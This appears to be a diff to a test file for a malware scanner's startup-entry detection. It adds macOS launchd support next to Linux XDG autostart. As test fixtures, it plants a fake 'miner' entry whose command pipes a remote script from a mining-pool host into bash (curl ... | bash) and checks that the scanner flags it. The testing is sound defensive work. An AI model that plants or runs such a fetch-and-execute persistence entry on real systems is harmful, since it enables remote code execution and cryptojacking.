@@ -32,6 +32,9 @@ const { WorkspaceStore } = await import("../../../src/state/workspace-store.ts")
 const store = new WorkspaceStore("shield-test", join(XR_HOME, "shield.db"));
 const shield = new XRShieldService(store);
 
+/** Planted startup-miner entry name — platform-shaped (see section 3). */
+const MINER_ENTRY_NAME = process.platform === "darwin" ? "zz-xr-miner.plist" : "zz-xr-miner.desktop";
+
 // ── 1. State bootstrap is honest ────────────────────────────────────────────
 {
   const s = shield.getState();
@@ -57,19 +60,31 @@ const shield = new XRShieldService(store);
 
 // ── 3. Startup entries: detects planted threats, never invents them ─────────
 {
-  mkdirSync(join(HOME, ".config", "autostart"), { recursive: true });
+  // Startup persistence is OS-shaped: Linux uses XDG autostart (.desktop),
+  // macOS uses launchd agents (.plist). Plant the entry in the location the
+  // CURRENT platform actually enumerates — asserting launchd detection by
+  // planting an XDG file (or vice versa) would test nothing real.
+  const isDarwin = process.platform === "darwin";
+  const startupDir = isDarwin ? join(HOME, "Library", "LaunchAgents") : join(HOME, ".config", "autostart");
+  const minerName = MINER_ENTRY_NAME;
+  const notesName = isDarwin ? "zz-xr-notes.plist" : "zz-xr-notes.desktop";
+  mkdirSync(startupDir, { recursive: true });
   writeFileSync(
-    join(HOME, ".config", "autostart", "zz-xr-miner.desktop"),
-    "[Desktop Entry]\nType=Application\nName=Miner\nExec=curl http://pool.supportxmr.com/x.sh | bash\n",
+    join(startupDir, minerName),
+    isDarwin
+      ? '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>zz-xr-miner</string><key>ProgramArguments</key><array><string>curl</string><string>http://pool.supportxmr.com/x.sh</string></array></dict></plist>\n'
+      : "[Desktop Entry]\nType=Application\nName=Miner\nExec=curl http://pool.supportxmr.com/x.sh | bash\n",
   );
   writeFileSync(
-    join(HOME, ".config", "autostart", "zz-xr-notes.desktop"),
-    "[Desktop Entry]\nType=Application\nName=Notes\nExec=/usr/bin/gedit %U\n",
+    join(startupDir, notesName),
+    isDarwin
+      ? '<?xml version="1.0" encoding="UTF-8"?>\n<plist version="1.0"><dict><key>Label</key><string>zz-xr-notes</string><key>ProgramArguments</key><array><string>/usr/bin/gedit</string></array></dict></plist>\n'
+      : "[Desktop Entry]\nType=Application\nName=Notes\nExec=/usr/bin/gedit %U\n",
   );
 
   const entries = await shield.getStartupEntries();
-  const miner = entries.find((e) => e.name === "zz-xr-miner.desktop");
-  const notes = entries.find((e) => e.name === "zz-xr-notes.desktop");
+  const miner = entries.find((e) => e.name === minerName);
+  const notes = entries.find((e) => e.name === notesName);
   check("startup-detects-miner-cmdline", Boolean(miner && miner.suspicious === true && (miner.reason ?? "").length > 0));
   check("startup-benign-not-flagged", Boolean(notes && notes.suspicious === false));
 }
@@ -150,7 +165,7 @@ const shield = new XRShieldService(store);
   check("scan-audited", store.recentAudit(50).map((r) => r.event).includes("shield.scan"));
 
   // Whitelist suppression (with audit trail).
-  shield.whitelistItem("startup", "zz-xr-miner.desktop");
+  shield.whitelistItem("startup", MINER_ENTRY_NAME);
   const after = await shield.runScan("full");
   check("whitelist-suppresses-threat", !after.some((t) => t.title.includes("zz-xr-miner")));
   check("whitelist-audited", store.recentAudit(50).map((r) => r.event).includes("shield.whitelist"));
